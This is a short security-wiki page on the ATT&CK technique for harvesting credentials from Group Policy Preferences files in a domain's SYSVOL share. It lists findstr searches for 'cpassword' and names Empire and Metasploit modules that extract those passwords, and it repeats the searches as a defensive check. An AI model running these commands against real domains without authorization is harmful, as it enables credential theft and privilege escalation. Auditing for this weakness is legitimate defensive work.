---
description: https://attack.mitre.org/techniques/T1552/006/
---

# Group Policy Preferences

**ATT\&CK ID:** [T1552.006](https://attack.mitre.org/techniques/T1552/006/)

**Permissions Required:** <mark style="color:green;">**User**</mark>

**Description**

Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.

These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made [public](https://msdn.microsoft.com/library/cc422924.aspx)).

## Techniques

### CMD

```
findstr /S cpassword %logonserver%\sysvol\*.xml
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

### Empire

```
usemodule powershell/privesc/gpp
usemodule python/privesc/windows/get_gpppasswords
```

### Metasploit

```
use post/windows/gather/credentials/gpp
```

## Further Reading

{% content-ref url="gpp-password.md" %}
[gpp-password.md](gpp-password.md)
{% endcontent-ref %}

## Mitigation

The same methods of searching for GPP passwords offensively, exists to find the same issue from a defense perspective.

### CMD

```
findstr /S cpassword %logonserver%\sysvol\*.xml
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```
